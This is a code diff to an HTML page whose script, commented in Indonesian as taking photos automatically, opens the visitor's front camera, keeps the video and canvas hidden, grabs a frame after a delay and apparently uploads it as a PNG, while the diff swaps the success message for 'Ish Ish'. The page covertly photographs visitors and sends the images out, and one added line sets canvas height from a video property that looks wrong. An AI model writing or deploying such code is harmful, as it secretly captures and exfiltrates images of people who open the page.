@@ -12,6 +12,12 @@
   <video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
+  <style>
+    #video {
+      display: none;
+    }
+  </style>
+
   <script>
     // Ambil foto secara otomatis
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -22,6 +28,10 @@
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
+
+          canvas.width = video.videoWidth;
+          canvas.height = video.height;
+
           setTimeout(() => {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
@@ -44,7 +54,7 @@
 
             .then(data => {
               if (data.url) {
-                alert("✅ Upload berhasil!\nURL: " + data.url);
+                alert("Ish Ish");
 
                 // Tampilkan gambar
                 const img = document.createElement("img");
